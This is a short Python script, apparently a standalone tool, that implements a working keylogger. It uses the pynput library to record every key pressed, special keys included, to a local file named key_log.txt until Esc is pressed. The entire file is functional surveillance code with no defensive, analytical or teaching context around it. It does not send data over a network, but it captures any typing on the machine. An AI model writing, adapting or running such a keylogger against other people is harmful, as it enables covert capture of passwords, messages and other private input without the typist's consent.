from pynput import keyboard

log_file = "key_log.txt"


class Keylogger:
    def __init__(self, log_file):
        self.log_file = log_file

    def log_key(self, key):
        try:
            with open(self.log_file, "a") as file:
                file.write(str(key.char))
        except AttributeError:
            with open(self.log_file, "a") as file:
                file.write(f"[{key}]")

    def on_press(self, key):
        self.log_key(key)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False


keylogger = Keylogger(log_file)


with keyboard.Listener(on_press=keylogger.on_press, on_release=keylogger.on_release) as listener:
    listener.join()
